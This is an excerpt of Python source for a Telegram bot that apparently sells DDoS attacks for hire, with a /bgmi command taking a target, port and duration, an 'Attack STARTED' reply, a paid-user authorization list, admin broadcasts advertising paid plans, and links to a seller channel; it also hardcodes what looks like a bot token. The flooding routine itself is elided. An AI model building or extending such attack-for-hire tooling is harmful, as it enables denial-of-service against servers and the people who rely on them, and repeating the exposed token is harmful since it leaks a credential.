...
bot = telebot.TeleBot('7670182495:AAHbfau9EqJn6gYWrs1oCowdrOQwA9j9dOY')
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY DDOS.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/DDOS_SELLER_12"
    bot.reply_to(message, response)
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            response = "Usage :- /bgmi <target> <port> <time>\nBy https://t.me/DDOS_SELLER_12"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy PERFECT BOT DM TO GET ACCESS @DDOS_SELLER_1"
...
def broadcast_message(message):
    ...
    if user_id in admin_id:
        ...
        if len(command) > 1:
            message_to_broadcast = "AGR MERI FILE SAHI SE WORK NHI KR RHI TI PAID LO 300 SEC OWNER DDOS:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
...
while True:
 ...
 #https://t.me/DDOS_SELLER_12 OWMER @DDOS_SELLER_1
